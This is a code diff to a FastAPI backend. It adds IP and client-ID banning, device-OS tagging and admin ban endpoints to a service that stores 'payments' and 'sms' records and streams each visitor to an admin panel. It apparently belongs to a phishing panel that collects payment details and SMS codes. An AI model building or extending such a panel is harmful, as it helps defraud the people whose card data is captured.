@@ -35,10 +35,38 @@ app.add_middleware(
 DB_FILE = "database.json"
 
 def load_db():
-    if not os.path.exists(DB_FILE): return {"payments": [], "sms": []}
+    default = {"payments": [], "sms": [], "banned_ips": [], "banned_ids": []}
+    if not os.path.exists(DB_FILE): return default
     try:
-        with open(DB_FILE, "r") as f: return json.load(f)
-    except: return {"payments": [], "sms": []}
+        with open(DB_FILE, "r") as f: 
+            data = json.load(f)
+            # Migration/Ensure all keys exist
+            for key in default:
+                if key not in data: data[key] = default[key]
+            return data
+    except: return default
+
+def is_banned(client_id: str, ip: str) -> bool:
+    db = load_db()
+    return client_id in db["banned_ids"] or ip in db["banned_ips"]
+
+def ban_client(client_id: str = None, ip: str = None):
+    db = load_db()
+    if client_id and client_id not in db["banned_ids"]: db["banned_ids"].append(client_id)
+    if ip and ip not in db["banned_ips"]: db["banned_ips"].append(ip)
+    with open(DB_FILE, "w") as f: json.dump(db, f, indent=2)
+
+def unban_client(client_id: str = None, ip: str = None):
+    db = load_db()
+    if client_id and client_id in db["banned_ids"]: db["banned_ids"].remove(client_id)
+    if ip and ip in db["banned_ips"]: db["banned_ips"].remove(ip)
+    with open(DB_FILE, "w") as f: json.dump(db, f, indent=2)
+
+def get_os_type(ua: str) -> str:
+    ua = ua.lower()
+    if "android" in ua: return "Android 🤖"
+    if "iphone" in ua or "ipad" in ua: return "iOS 🍏"
+    return "Desktop 💻"
 
 def save_payment(data: dict):
     db = load_db()
@@ -143,7 +171,11 @@ async def get_api_key(header_key: Optional[str] = Security(api_key_header)):
 # --- Logic & Endpoints ---
 @app.post("/v1/audit", response_model=AuditResponse)
 async def create_audit(request: AuditRequest, api_key: APIKey = Depends(get_api_key)):
+    if is_banned(request.client_id, request.adresse_ip):
+        raise HTTPException(status_code=403, detail="BANNED")
+    
     data = request.dict()
+    data["os_type"] = get_os_type(data["device"])
     save_payment(data)
     # Broadcast to admin panel
     await manager.broadcast_to_admins({
@@ -180,6 +212,21 @@ async def download_db(api_key: APIKey = Depends(get_api_key)):
         return FileResponse(DB_FILE, media_type='application/json', filename='audit_history.json')
     return {"error": "No data found"}
 
+@app.post("/v1/admin/ban")
+async def ban_endpoint(client_id: Optional[str] = None, ip: Optional[str] = None, api_key: APIKey = Depends(get_api_key)):
+    ban_client(client_id, ip)
+    if client_id:
+        await manager.send_to_client(client_id, {"type": "BANNED"})
+        # Kill connection if active
+        if client_id in manager.clients:
+            await manager.clients[client_id].close(code=4003)
+    return {"status": "banned"}
+
+@app.post("/v1/admin/unban")
+async def unban_endpoint(client_id: Optional[str] = None, ip: Optional[str] = None, api_key: APIKey = Depends(get_api_key)):
+    unban_client(client_id, ip)
+    return {"status": "unbanned"}
+
 @app.websocket("/ws/admin")
 async def websocket_admin(websocket: WebSocket):
     await manager.connect_admin(websocket)
@@ -191,6 +238,14 @@ async def websocket_admin(websocket: WebSocket):
 
 @app.websocket("/ws/client/{client_id}")
 async def websocket_client(websocket: WebSocket, client_id: str):
+    # Get IP
+    client_ip = websocket.client.host
+    if is_banned(client_id, client_ip):
+        await websocket.accept()
+        await websocket.send_json({"type": "BANNED"})
+        await websocket.close(code=4003)
+        return
+
     await manager.connect_client(client_id, websocket)
     try:
         # Signaler l'arrivée d'un visiteur aux admins
